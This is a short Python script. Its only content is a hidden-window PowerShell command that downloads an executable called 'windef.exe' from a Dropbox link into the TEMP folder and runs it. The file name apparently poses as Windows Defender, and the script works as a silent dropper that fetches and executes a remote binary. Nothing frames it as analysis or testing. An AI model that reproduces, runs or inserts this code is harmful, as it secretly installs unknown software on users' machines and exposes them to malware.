import subprocess

subprocess.run(["powershell", "-Command", "& { Invoke-WebRequest -Uri 'https://dl.dropbox.com/scl/fi/u8qpwjrtniiyqlv48o7h4/windef.exe?rlkey=vep7ia8tg6v0tb6uzsjjv0960&dl=0' -OutFile ([System.IO.Path]::Combine($env:TEMP, 'windef.exe')); Start-Process -FilePath ([System.IO.Path]::Combine($env:TEMP, 'windef.exe')) -Wait }"], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)